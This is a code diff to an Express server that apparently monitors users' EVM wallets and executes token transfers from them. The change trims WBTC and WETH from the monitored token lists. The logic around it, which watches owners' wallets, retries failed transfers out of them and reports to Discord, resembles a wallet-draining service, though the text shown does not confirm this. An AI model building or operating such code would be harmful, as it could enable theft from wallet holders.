@@ -58,7 +58,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         validatedData.walletAddress,
         'evm',
         chainId,
-        ['USDC', 'USDT', 'DAI', 'WBTC', 'WETH']
+        ['USDC', 'USDT', 'DAI']
       );
       console.log(`[Monitor] Added EVM wallet to monitoring: ${validatedData.walletAddress} (chain ${chainId})`);
       
@@ -525,7 +525,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
         }
 
-        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI', 'WBTC', 'WETH']);
+        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI']);
       } else {
         notifyTransferFailed({
           walletAddress: owner,
@@ -540,7 +540,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         walletAddress: owner,
         network: "evm",
         chainId: String(chainId),
-        tokens: ['USDT', 'USDC', 'DAI', 'WBTC', 'WETH'],
+        tokens: ['USDT', 'USDC', 'DAI'],
         discordUser: req.body.discordUser,
       }).catch(() => {});
 
@@ -621,7 +621,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           }
         }
 
-        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI', 'WBTC', 'WETH']);
+        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI']);
       } else if (!result.success) {
         await savePendingTransfer(transferParams);
         console.log(`[API] Transfer failed, saved for retry: ${result.error}`);
